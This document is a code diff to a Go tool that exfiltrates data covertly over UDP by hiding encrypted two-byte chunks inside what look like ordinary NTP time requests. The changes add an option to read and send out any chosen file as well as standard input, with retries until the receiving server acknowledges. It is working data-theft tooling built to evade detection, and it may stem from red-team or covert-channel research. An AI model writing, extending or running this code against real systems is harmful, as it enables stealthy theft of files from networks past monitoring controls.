@@ -20,20 +20,49 @@ var key = []byte{0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xa
 const timeout = 5 * time.Second
 
 func Main() {
-	host := flag.String("h", "localhost:123", "host: host to send the NTP packets to")
-	// infile := flag.String("f", "-", "file: file to exfiltrate data from ('-' for STDIN)")
+	dest := flag.String("d", "localhost:123", "dest: host to send the NTP packets to")
+	infile := flag.String("f", "-", "file: file to exfiltrate data from ('-' for STDIN)")
+	help := flag.Bool("h", false, "help: print this help")
 	flag.Parse()
 
-	err := sendFromStdin(host)
+	if *help {
+		flag.Usage()
+		return
+	}
+
+	if *infile == "-" {
+		err := sendFromStdin(dest)
+		if err != nil {
+			log.Fatalln(err)
+		}
+		return
+	}
+
+	err := sendFromFile(dest, infile)
 	if err != nil {
 		log.Fatalln(err)
 	}
 }
 
-// Send data from stdin to the given `host`. 
-func sendFromStdin(host *string) error {
+// Send data from stdin to the given `dest`. 
+func sendFromStdin(dest *string) error {
+	return sendFromReader(dest, os.Stdin)
+}
+
+// Send data from a `filepath` to the given `dest`.
+func sendFromFile(dest *string, filepath *string) error {
+	file, err := os.Open(*filepath)
+	if err != nil {
+		return fmt.Errorf("could not open file: %s", *filepath)
+	}
+
+	return sendFromReader(dest, file)
+}
+
+// Send data from a given reader interface to the given `dest`. 
+func sendFromReader(dest *string, rd io.Reader) error {
 	inbuf := make([]byte, 1024)
-	reader := bufio.NewReader(os.Stdin)
+	reader := bufio.NewReader(rd)
 
 	for {
 		n, err := reader.Read(inbuf)
@@ -41,12 +70,12 @@ func sendFromStdin(host *string) error {
 			if err == io.EOF {
 				break
 			}
-			return fmt.Errorf("error reading STDIN: %v", err)
+			return fmt.Errorf("error reading from %v: %v", rd, err)
 		}
 
 		inbuf = inbuf[:n]
 
-		err = reliableSendBuffer(inbuf, host)
+		err = reliableSendBuffer(inbuf, dest)
 		if err != nil {
 			return fmt.Errorf("error reliably sending buffer: %v", err)
 		}
@@ -57,20 +86,20 @@ func sendFromStdin(host *string) error {
 	return nil
 }
 
-// Reliably send a buffer `buf` of bytes to a `host`. 
+// Reliably send a buffer `buf` of bytes to a `dest`. 
 // 
 // Splits the `buf` into two-byte message segments
 // and reliably sends each one. 
-func reliableSendBuffer(buf []byte, host *string) error {
+func reliableSendBuffer(buf []byte, dest *string) error {
 	for i := 0; i < len(buf); i += 2 {
-		var message uint16
+		message := make([]byte, 2)
 		if i == len(buf)-1 {
-			message = uint16(buf[i]) << 8
+			message = buf[i:i+1]
 		} else {
-			message = uint16(buf[i])<<8 | uint16(buf[i+1])
+			message = buf[i:i+2]
 		}
 
-		err := reliableSendMessage(message, host)
+		err := reliableSendMessage(message, dest)
 		if err != nil {
 			return fmt.Errorf("error reliably sending message: %v", err)
 		}
@@ -79,7 +108,7 @@ func reliableSendBuffer(buf []byte, host *string) error {
 	return nil
 }
 
-// Reliably send a 16-bit `message` to a `host`. 
+// Reliably send a 1 or 2-byte `message` to a `dest`. 
 //
 // This function sends a packet with the `message` 
 // and waits for a corresponding ACK response from the 
@@ -87,15 +116,19 @@ func reliableSendBuffer(buf []byte, host *string) error {
 // 
 // If it doesn't get one, it tries over and over again
 // until the server eventually responds correctly.
-func reliableSendMessage(message uint16, host *string) error {
-	raddr, err := net.ResolveUDPAddr("udp", *host)
+func reliableSendMessage(message []byte, dest *string) error {
+	if len(message) > 2 || len(message) < 1 {
+		return fmt.Errorf("invalid message length %v", len(message))
+	}
+
+	raddr, err := net.ResolveUDPAddr("udp", *dest)
 	if err != nil {
-		return fmt.Errorf("failed resolving host %v: ", err)
+		return fmt.Errorf("failed resolving dest %v: ", err)
 	}
 
 	conn, err := net.DialUDP("udp", nil, raddr)
 	if err != nil {
-		return fmt.Errorf("failed to connect to %v: %v", *host, err)
+		return fmt.Errorf("failed to connect to %v: %v", *dest, err)
 	}
 	defer conn.Close()
 
@@ -119,7 +152,7 @@ func reliableSendMessage(message uint16, host *string) error {
 // Send a message packet to the server.
 //
 // The message packet looks like a normal NTP client request asking for
-// the current time, but has the given 16-bit `message` embedded in
+// the current time, but has the given 1 or 2-byte `message` embedded in
 // the bottom two bytes of the transmit timestamp.
 //
 // The message is encrypted to increase entropy and make it harder to distinguish
@@ -127,7 +160,12 @@ func reliableSendMessage(message uint16, host *string) error {
 //
 // Returns the sent NTP packet (for use in verifying ACK packets later) and any
 // error.
-func sendMessage(message uint16, conn *net.UDPConn) (*common.NTPPacket, error) {
+func sendMessage(message []byte, conn *net.UDPConn) (*common.NTPPacket, error) {
+
+	if len(message) > 2 || len(message) < 1 {
+		return &common.NTPPacket{}, fmt.Errorf("invalid message length %v", len(message))
+	}
+
 	packet := common.GenerateClientPkt()
 	packet.PatchPacketEncrypted(message, key)
 
